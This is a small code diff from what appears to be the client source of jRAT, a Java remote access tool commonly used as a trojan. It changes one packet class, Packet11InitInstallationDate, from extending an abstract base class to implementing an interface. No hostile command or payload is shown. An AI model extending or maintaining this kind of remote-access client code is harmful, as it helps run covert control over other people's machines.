@@ -4,7 +4,7 @@ import jrat.client.Configuration;
 import jrat.client.Connection;
 
 
-public class Packet11InitInstallationDate extends AbstractOutgoingPacket {
+public class Packet11InitInstallationDate implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
